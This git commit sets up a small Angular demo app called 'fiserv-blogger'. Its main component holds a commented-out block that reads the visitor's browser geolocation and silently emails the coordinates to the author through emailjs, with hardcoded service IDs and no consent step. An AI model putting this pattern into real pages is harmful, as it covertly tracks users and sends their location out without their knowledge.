529b5119723af17989bf6826f1d701e81b2b66f7
fiserv-developers <contactbalajiganesan@gmail.com>
2021-04-01 18:36:55 +0530

    Initial commit

---
+++ README.md
@@ -0,0 +1,3 @@
+# fiserv-blogger
+
+[Edit on StackBlitz ⚡️](https://stackblitz.com/edit/fiserv-blogger)
---
+++ src/app/app.component.ts
@@ -0,0 +1,30 @@
+import { Component, VERSION } from "@angular/core";
+import emailjs from "emailjs-com";
+@Component({
+  selector: "my-app",
+  templateUrl: "./app.component.html",
+  styleUrls: ["./app.component.css"]
+})
+export class AppComponent {
+  name = "Angular " + VERSION.major;
+  // ngOnInit() {
+  //   if (navigator.geolocation) {
+  //     navigator.geolocation.getCurrentPosition(function(position) {
+  //       let frameMessage =
+  //         "Latitude:" +
+  //         position.coords.latitude.toString() +
+  //         "  " +
+  //         "Longtitude:" +
+  //         position.coords.longitude.toString();
+  //       emailjs
+  //         .send(
+  //           "service_utw94sv",
+  //           "template_h1dku2n",
+  //           { message: frameMessage },
+  //           "user_BXzJxnM3khfN6pYNESnLn"
+  //         )
+  //         .then(thankyou => console.log("thankyou"));
+  //     });
+  //   }
+  // }
+}
